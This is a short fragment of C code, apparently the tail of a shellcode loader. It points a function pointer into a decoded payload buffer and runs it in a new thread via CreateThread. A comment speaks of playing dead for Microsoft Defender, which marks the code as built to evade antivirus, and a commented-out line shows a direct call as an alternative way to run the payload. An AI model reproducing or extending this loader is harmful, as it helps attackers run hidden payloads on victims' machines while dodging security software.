        payload_fnc = bDecodedPayload + 1;
        
        //play dead for Microsoft Defender, because why not

        CreateThread(NULL, NULL, payload_fnc, NULL, NULL, NULL);
        //(*(void (*)()) payload_fnc)();

	return;
}